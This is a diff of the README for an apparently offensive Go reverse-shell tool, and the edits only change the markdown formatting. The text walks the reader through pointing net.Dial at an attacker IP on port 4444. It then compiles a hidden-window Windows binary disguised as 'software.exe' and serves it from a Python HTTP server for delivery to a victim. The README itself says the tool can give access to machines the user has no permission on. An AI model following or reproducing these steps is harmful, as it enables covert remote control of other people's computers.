@@ -21,18 +21,18 @@ can be used for gain access into machines you don't have permissions. Please, al
 
  Since you've cloned the repo. Just navigate into it and execute the command "nano reverse_shell.go". Then, replace the part
  
-  " net.Dial("tcp", "Put_attacker_ip_machine:4444") "  to your attacker IP_MACHINE in the part "Put_attacker_ip_machine" and keep the port 4444.
+  > net.Dial("tcp", "Put_attacker_ip_machine:4444")   to  >  your attacker IP_MACHINE in the part "Put_attacker_ip_machine" and keep the port 4444.
 
-  expected : net.Dial("tcp", "192.168.1.101:4444) 
+  expected :  >  net.Dial("tcp", "192.168.1.101:4444) 
   
   
  Next that, compile with :
  
- " GOOS=windows GOARCH=amd64 go build -dflags="-H windowsgui -s -W" -o software.exe reverse_shell.go "
+  >  GOOS=windows GOARCH=amd64 go build -dflags="-H windowsgui -s -W" -o software.exe reverse_shell.go 
  
 🚫 If compile does no run successfully :
 
- " GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o software.exe reverse_shell.go "
+  >  GOOS=windows GOARCH=amd64 go build -ldflags="-H windowsgui -s -w" -o software.exe reverse_shell.go "
  
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -42,13 +42,13 @@ can be used for gain access into machines you don't have permissions. Please, al
  
   > python3 --version
   
-  expected output : Python 3.13.5
+  expected output : >  Python 3.13.5
   
   Then, Make a temporal server.
   
   > python3 -m http.server 8000
   
-  expected output : └──╼ $ python3 -m http.server 8000
+  expected output : >  └──╼ $ python3 -m http.server 8000
 
                     Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
